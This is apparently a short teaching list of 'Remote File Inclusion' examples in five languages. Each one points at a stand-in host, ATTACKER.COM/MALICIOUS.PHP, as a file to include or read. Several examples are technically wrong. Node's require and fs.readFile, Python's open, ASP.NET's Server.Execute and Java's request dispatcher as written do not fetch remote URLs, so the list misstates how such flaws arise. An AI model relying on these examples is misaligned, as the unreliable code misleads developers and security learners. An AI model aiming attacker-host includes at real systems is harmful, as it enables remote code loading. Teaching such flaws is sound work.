### Remote File Inclusion (RFI) Examples

1. **ASP.NET**:
   - Example vulnerable code: `Server.Execute("page=HTTP://ATTACKER.COM/MALICIOUS.PHP")`

2. **Java**:
   - Example vulnerable code:
     ```java
     RequestDispatcher rd = request.getRequestDispatcher("page=HTTP://ATTACKER.COM/MALICIOUS.PHP"); 
     rd.include(request, response);
     ```

3. **Node.js**:
   - Example vulnerable code:
     ```javascript
     require("HTTP://ATTACKER.COM/MALICIOUS.PHP");
     
     const fs = require('fs');
     fs.readFile("HTTP://ATTACKER.COM/MALICIOUS.PHP", (err, data) => {
       if (err) throw err;
       console.log(data);
     });
     ```

4. **Python**:
   - Example vulnerable code:
     ```python
     with open("HTTP://ATTACKER.COM/MALICIOUS.PHP", 'r') as file:
         data = file.read()
     ```

5. **Ruby on Rails**:
   - Example vulnerable code:
     ```ruby
     render file: "HTTP://ATTACKER.COM/MALICIOUS.PHP"
     ```

